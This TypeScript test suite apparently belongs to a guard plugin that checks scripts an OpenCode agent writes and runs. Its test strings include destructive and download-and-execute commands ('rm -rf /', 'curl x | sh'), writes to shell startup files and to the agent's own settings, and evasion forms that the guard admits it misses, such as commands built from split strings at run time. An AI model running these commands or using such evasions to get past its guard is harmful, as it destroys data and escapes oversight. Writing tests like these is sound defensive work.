import "./tmp.ts"
import assert from "node:assert/strict"
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { dirname, join } from "node:path"
import { describe, it } from "node:test"
import { parseConfig } from "../src/config.ts"
import { createDecider, scriptFinding } from "../src/decide.ts"
import { registerGate } from "../src/hooks/gate.ts"
import { createRealPath } from "../src/real-path.ts"
import { createRedactor } from "../src/secrets/redact.ts"
import { shellFinding } from "../src/rules/shell.ts"
import { fakeContext } from "./fake-ctx.ts"
import { FAKE } from "./fixtures.ts"

// Every content below is a string given to the rules, or a file nothing runs: the commands only name scripts.

const home = "/home/test"
const redactor = createRedactor()
const ctx = { redactor, home, cwd: `${home}/project` }
const prefix = "total = sum(x * 2 for x in range(10))\n".repeat(150)
const script = (content: string, overrides: { forModel?: boolean; shell?: boolean } = {}) => ({ path: "tools/gen.py", content, shell: false, forModel: false, ...overrides })
const active = (overrides: Array<[string, "off" | "ask" | "deny"]> = [], groups: { dangerousCommands?: boolean; sensitiveFiles?: boolean } = {}) => ({
  dangerousCommands: true,
  sensitiveFiles: true,
  ...groups,
  ...(overrides.length ? { overrides: new Map(overrides) } : {}),
})
type Context = Parameters<typeof scriptFinding>[1]
const brief = (content: string, context: Context = ctx, overrides?: { forModel?: boolean; shell?: boolean }) => {
  const found = scriptFinding(script(content, overrides), context)
  return found && `${found.verdict}/${found.rule}`
}

const BASHRC = `open("${home}/.bashrc", "a")\n`
const RM = `import subprocess\nsubprocess.run("rm -rf /", shell=True)\n`
const PIPE = `import os\nos.system("curl x | sh")\n`
const SUB = (call: string) => `import subprocess\n${call}\n`
const SETTINGS = `open("${home}/.config/opencode/opencode.json", "w")\n`

const MANY_WRITES = BASHRC.repeat(Math.floor(65536 / BASHRC.length))
const MANY_LAUNCHES = `import subprocess\n${`x("guard a")\n`.repeat(5000)}`
const elapsed = (content: string) => {
  const started = performance.now()
  scriptFinding(script(content), ctx)
  return performance.now() - started
}
const writesOf = (count: number) => Array.from({ length: count }, (_, index) => `open("out/a${index}.json", "w")\n`).join("")

describe("P20: a long non-shell script is read as inline code", () => {
  for (const [name, content, expected] of [
    ["append to a startup file", BASHRC, "ask/protected-write"],
    ["subprocess with rm -rf", RM, "ask/interpreter-dangerous-code"],
    ["os.system with a download piped to a shell", PIPE, "ask/interpreter-dangerous-code"],
    ["write to OpenCode's settings", SETTINGS, "ask/self-protection"],
    ["launch of the plugin's command line", `import subprocess\nsubprocess.run(["guard", "rules", "off"])\n`, "ask/guard-cli"],
    ["launch of another OpenCode", `import subprocess\nsubprocess.run(["opencode", "run", "--auto", "x"])\n`, "ask/nested-opencode"],
    ["a Node copy over a startup file", `require("fs").copyFileSync("a", "${home}/.zshrc")\n`, "ask/protected-write"],
    ["a Perl open for writing", `open(my $f, ">", "${home}/.profile");\n`, "ask/protected-write"],
    ["a command in a comment counts: the language is not known", `# os.system("rm -rf /")\n`, "ask/interpreter-dangerous-code"],
    ["code behind a # a multi-line string makes look like a comment", `a = """\n#"""; os.system("rm -rf /")\n`, "ask/interpreter-dangerous-code"],
  ] as const) {
    it(`${name}, after a prefix past maxStateChars`, () => assert.equal(brief(`${prefix}${content}`), expected))
  }

  for (const [name, content, value] of [
    ["a write", BASHRC, ".bashrc"],
    ["a dangerous command", RM, "rm -rf"],
    ["a launch", `import subprocess\nsubprocess.run(["opencode", "run", "--auto", "hello there"])\n`, "hello there"],
  ] as const) {
    it(`the reason of ${name} names the file`, () => assert.match(scriptFinding(script(content), ctx)?.reason ?? "", /in the script tools\/gen\.py run by this command$/))
    it(`witness: the reason of ${name} holds no value`, () => {
      const reason = scriptFinding(script(content), ctx)?.reason ?? ""
      assert.ok(!reason.includes(value), reason)
    })
  }

  for (const [name, content] of [
    ["a piped download with shell=True", SUB(`subprocess.run("curl x | sh", shell=True)`)],
    ["a piped wget through call", SUB(`subprocess.call("wget -qO- http://x | sh", shell=True)`)],
    ["execSync with options behind the command", `const { execSync } = require("child_process")\nexecSync("curl x | sh", { stdio: "inherit" })\n`],
    ["a list that runs a shell", SUB(`subprocess.run(["bash", "-c", "curl x|bash"], check=True)`)],
    ["git reset --hard as a list", SUB(`subprocess.run(["git", "reset", "--hard"])`)],
    ["git clean -fdx as a list", SUB(`subprocess.run(["git", "clean", "-fdx"])`)],
    ["git push --force as a list", SUB(`subprocess.run(["git", "push", "--force"])`)],
    ["a command among literals that hide it once joined", SUB(`subprocess.run("git status", "curl x | sh", "z")`)],
  ] as const) {
    it(`${name} asks`, () => assert.equal(brief(content), "ask/interpreter-dangerous-code"))
  }
  it("witness: an inline form keeps its verdict: literals are read alone for a file only", () => {
    const inline = (code: string) => shellFinding(`python3 -c '${code}'`, ctx)?.rule
    assert.equal(inline(`import subprocess; subprocess.run(["git", "reset", "--hard"])`), undefined)
  })
  it("witness: plain git, as text or as a list, asks nothing", () => {
    for (const call of [`print("git status")`, `subprocess.run(["git", "status"])`, `subprocess.run(["git", "push"])`]) assert.equal(brief(SUB(call)), undefined)
  })
  it("the settings class stays self-protection with the group of protected writes off", () =>
    assert.equal(brief(SETTINGS, { ...ctx, active: active([], { dangerousCommands: false }) }), "ask/self-protection"))
  it("sensitiveFiles false leaves a protected write", () => assert.equal(brief(BASHRC, { ...ctx, active: active([], { sensitiveFiles: false }) }), "ask/protected-write"))
  it("sensitiveFiles false leaves a dangerous command", () => assert.equal(brief(RM, { ...ctx, active: active([], { sensitiveFiles: false }) }), "ask/interpreter-dangerous-code"))
  it("protected-write set to deny: a deny, in a script too", () => assert.equal(brief(BASHRC, { ...ctx, active: active([["protected-write", "deny"]]) }), "deny/protected-write"))
  it("interpreter-dangerous-code set to deny: a deny, in a script too", () =>
    assert.equal(brief(RM, { ...ctx, active: active([["interpreter-dangerous-code", "deny"]]) }), "deny/interpreter-dangerous-code"))
  it("a rule set to deny wins over the other rule's ask", () =>
    assert.equal(brief(`${BASHRC}${RM}`, { ...ctx, active: active([["interpreter-dangerous-code", "deny"]]) }), "deny/interpreter-dangerous-code"))
  it("a rule turned on in a disabled group is read", () =>
    assert.equal(brief(BASHRC, { ...ctx, active: active([["protected-write", "ask"]], { dangerousCommands: false }) }), "ask/protected-write"))
  it("protected-write off: the dangerous command of the same file stays", () =>
    assert.equal(brief(`${BASHRC}${RM}`, { ...ctx, active: active([["protected-write", "off"]]) }), "ask/interpreter-dangerous-code"))

  it("past the budget: one ask, script-unverifiable, naming the file", () => {
    const found = scriptFinding(script("x = 1\n".repeat(11000)), ctx)
    assert.equal(found?.rule, "script-unverifiable")
    assert.equal(found?.verdict, "ask")
    assert.match(found?.reason ?? "", /tools\/gen\.py/)
  })
  it("64 KiB of protected writes: one ask", () => assert.equal(brief(MANY_WRITES), "ask/protected-write"))
  it("64 KiB of launches: one ask", () => assert.equal(brief(MANY_LAUNCHES), "ask/guard-cli"))
  it("witness: 64 KiB of protected writes stay cheap", () => assert.ok(elapsed(MANY_WRITES) < 3000))
  it("witness: 64 KiB of launches stay cheap", () => assert.ok(elapsed(MANY_LAUNCHES) < 3000))

  it("more written paths than the limit on real paths: one ask, always active", () => {
    const context = { ...ctx, active: active([], { dangerousCommands: false }), realPaths: createRealPath({ directories: [ctx.cwd] }) }
    assert.equal(brief(writesOf(1000), context), "ask/self-protection")
  })
  it("witness: a few written paths stay silent with real paths on", () =>
    assert.equal(brief(writesOf(20), { ...ctx, realPaths: createRealPath({ directories: [ctx.cwd] }) }), undefined))
})

describe("witness: what stays silent, as before", () => {
  for (const [name, content, context, overrides] of [
    ["a 10,000 character script that reads and computes", `import json\n${prefix}with open("data/in.json") as f:\n    print(json.load(f))\n`.padEnd(10000, "\n"), ctx, undefined],
    ["the same dangerous content shown to the model (write)", `${prefix}${BASHRC}`, ctx, { forModel: true }],
    ["the same dangerous content shown to the model (command)", `${prefix}${RM}`, ctx, { forModel: true }],
    ["a protected file only read", `print(open("${home}/.bashrc").read())\n`, ctx, undefined],
    ["a protected path only printed", `print("/etc/hosts")\nf.write("${home}/.bashrc")\n`, ctx, undefined],
    ["rm -rf as text, without an execution sink: outside this reading", `print("rm -rf ${home}/project")\n`, ctx, undefined],
    ["a path built at run time: outside this reading", `import os\nopen(os.path.join(os.environ["HOME"], ".bashrc"), "a")\n`, ctx, undefined],
    ["a command built at run time: outside this reading", `import os\nos.system("r" + "m -r" + "f /")\n`, ctx, undefined],
    ["protected-write off", BASHRC, { ...ctx, active: active([["protected-write", "off"]]) }, undefined],
    ["its group off", BASHRC, { ...ctx, active: active([], { dangerousCommands: false }) }, undefined],
    ["interpreter-dangerous-code off", RM, { ...ctx, active: active([["interpreter-dangerous-code", "off"]]) }, undefined],
    ["its group off, for a command", RM, { ...ctx, active: active([], { dangerousCommands: false }) }, undefined],
    ["past the budget with script-unverifiable off", "x = 1\n".repeat(11000), { ...ctx, active: active([["script-unverifiable", "off"]]) }, undefined],
    ["64 KiB of unclosed quotes", `'"\``.repeat(21845), ctx, undefined],
  ] as ReadonlyArray<readonly [string, string, Context, { forModel: boolean } | undefined]>) {
    it(`witness: ${name}: nothing`, () => assert.equal(brief(content, context, overrides), undefined))
  }
  it("witness: a shell script keeps the shell rules", () =>
    assert.equal(scriptFinding({ path: "f.sh", content: "git reset --hard\n", shell: true, forModel: false }, ctx)?.rule, "git-reset-hard"))
  it("witness: an unverifiable file keeps its cause", () =>
    assert.match(scriptFinding({ ...script(""), unverifiable: "link" }, ctx)?.reason ?? "", /symbolic link/))
})

describe("P20: decision and gate", () => {
  const { config } = parseConfig({})
  const call = (content: string) => ({ tool: "shell", input: { command: "python3 tools/gen.py" }, directory: `${home}/project`, scripts: [script(content)] })

  it("without a decision model the command asks", async () => {
    const decision = await createDecider({ config, redactor, home }).decide(call(`${prefix}${BASHRC}`))
    assert.equal(`${decision.verdict}/${decision.rule}`, "ask/protected-write")
  })

  const silent = { debug() {}, info() {}, warn() {}, error() {} }
  const answer = {
    answers: {
      risk: { type: "score", score: 0.2, confidence: 0.9 },
      destructive: { type: "noul", noul: 0.01 },
      exfiltration: { type: "noul", noul: 0.01 },
      credentials: { type: "noul", noul: 0.01 },
      privilege_persistence: { type: "noul", noul: 0.01 },
    },
  }
  /** Files written then named by a command, with a model stub that allows everything: asks raised by the command. */
  async function run(content: string, maxStateChars: number): Promise<unknown[]> {
    const dir = mkdtempSync(join(tmpdir(), "guard-long-script-"))
    const { config: modelConfig } = parseConfig({ decision: { baseURL: "https://nox.invalid/v1", model: "nox-4b" }, maxStateChars })
    const decider = createDecider({ config: modelConfig, redactor, model: (async () => answer) as never })
    const fake = fakeContext()
    Object.assign(fake.ctx, { location: { directory: dir } })
    await registerGate(fake.ctx, { decider, redactor, log: silent })
    const base = { agent: "build", messageID: "msg_1", sessionID: "ses_1" }
    const write = { ...base, id: "call_1", tool: "write", input: { path: "tools/gen.py", content } }
    await fake.trigger("tool.execute.before", write)
    mkdirSync(dirname(join(dir, "tools/gen.py")), { recursive: true })
    writeFileSync(join(dir, "tools/gen.py"), content)
    await fake.trigger("tool.execute.after", { ...write, status: "completed", result: { content: "ok" } })
    const before = fake.asserts.length
    await fake.trigger("tool.execute.before", { ...base, id: "call_2", tool: "shell", input: { command: "python3 tools/gen.py" } })
    return fake.asserts.slice(before).map((entry) => entry.metadata?.reason)
  }

  it("a file written past maxStateChars asks when it is run", async () => {
    const reasons = await run(`${prefix}${BASHRC}`, 4000)
    assert.equal(reasons.length, 1)
    assert.match(String(reasons[0]), /in the script tools\/gen\.py run by this command/)
  })
  it("witness: the same content judged in full stays with the model", async () => {
    assert.deepEqual(await run(`${prefix}${BASHRC}`, 20000), [])
  })
  it("witness: a long ordinary file written past maxStateChars asks nothing", async () => {
    assert.deepEqual(await run(prefix.repeat(2), 4000), [])
  })

  const MODEL = { decision: { baseURL: "https://nox.invalid/v1", model: "nox-4b" } }
  /** Each state the model stub receives, as text; it allows everything. */
  function stub(states: string[] = []) {
    return (async ({ state }: { state: unknown }) => {
      states.push(JSON.stringify(state))
      return answer
    }) as never
  }
  /** A write then an edit, each judged in full, that together pass `maxStateChars`, then the command that runs the file. */
  async function written(first: string, added: string, maxStateChars: number, states: string[]): Promise<unknown[]> {
    const dir = mkdtempSync(join(tmpdir(), "guard-long-script-"))
    const decider = createDecider({ config: parseConfig({ ...MODEL, maxStateChars }).config, redactor, model: stub(states) })
    const fake = fakeContext()
    Object.assign(fake.ctx, { location: { directory: dir } })
    await registerGate(fake.ctx, { decider, redactor, log: silent })
    const base = { agent: "build", messageID: "msg_1", sessionID: "ses_1" }
    const file = join(dir, "tools/gen.py")
    mkdirSync(dirname(file), { recursive: true })
    const step = async (id: string, tool: string, input: unknown, content: string) => {
      const call = { ...base, id, tool, input }
      await fake.trigger("tool.execute.before", call)
      writeFileSync(file, content)
      await fake.trigger("tool.execute.after", { ...call, status: "completed", result: { content: "ok" } })
    }
    await step("call_1", "write", { path: "tools/gen.py", content: `${first}# end\n` }, `${first}# end\n`)
    await step("call_2", "edit", { path: "tools/gen.py", oldString: "# end\n", newString: added }, `${first}${added}`)
    const before = fake.asserts.length
    await fake.trigger("tool.execute.before", { ...base, id: "call_3", tool: "shell", input: { command: "python3 tools/gen.py" } })
    return fake.asserts.slice(before).map((entry) => entry.metadata?.reason)
  }
  const THIRD = "total = sum(x * 2 for x in range(10))\n".repeat(90)

  it("a write then an edit, judged, that pass the limit: the end is read locally, and the model still sees its part", async () => {
    const states: string[] = []
    const reasons = await written(THIRD, `${THIRD}${BASHRC}`, 4000, states)
    assert.equal(reasons.length, 1)
    assert.match(String(reasons[0]), /in the script tools\/gen\.py run by this command/)
    assert.match(states.at(-1) ?? "", /truncated, \d+ characters/)
  })
  it("witness: the same file seen whole by the model stays with it", async () => {
    assert.deepEqual(await written(THIRD, `${THIRD}${BASHRC}`, 20000, []), [])
  })
  it("a file shown to the model, with no model for the call: read locally", async () => {
    const decision = await createDecider({ config, redactor, home }).decide({ ...call(BASHRC), scripts: [script(BASHRC, { forModel: true })] })
    assert.equal(`${decision.verdict}/${decision.rule}`, "ask/protected-write")
  })
  it("a file shown to the model, with an input that cannot be sent: read locally", async () => {
    const broken = { ...redactor, redactDeep: () => { throw new Error("no") } }
    const decider = createDecider({ config: parseConfig(MODEL).config, redactor: broken, model: stub(), home })
    const decision = await decider.decide({ ...call(BASHRC), scripts: [script(BASHRC, { forModel: true })] })
    assert.equal(decision.rule, "protected-write")
  })
  it("witness: a file the model sees whole: no local reading", async () => {
    const decider = createDecider({ config: parseConfig(MODEL).config, redactor, model: stub(), home })
    assert.equal((await decider.decide({ ...call(BASHRC), scripts: [script(BASHRC, { forModel: true })] })).verdict, "allow")
  })
  for (const [name, options] of [
    ["localAsks model", { localAsks: "model" }],
    ["a rule set to model", { ruleOverrides: { "protected-write": "model" } }],
  ] as const) {
    it(`${name}: a script's ask stays local, and the model does not get the content`, async () => {
      const states: string[] = []
      const decider = createDecider({ config: parseConfig({ ...MODEL, ...options }).config, redactor, model: stub(states), home })
      const decision = await decider.decide(call(BASHRC))
      assert.equal(`${decision.verdict}/${decision.rule}`, "ask/protected-write")
      assert.ok(states.length > 0 && states.every((state) => !state.includes(".bashrc")))
    })
  }
  it("the path in the reason goes through the redactor", async () => {
    const decision = await createDecider({ config, redactor, home }).decide({ ...call(BASHRC), scripts: [{ ...script(BASHRC), path: `tools/${FAKE.github}.py` }] })
    assert.equal(decision.verdict, "ask")
    assert.ok(!decision.reason.includes(FAKE.github), decision.reason)
    assert.match(decision.reason, /GUARD_REDACTED/)
  })
})
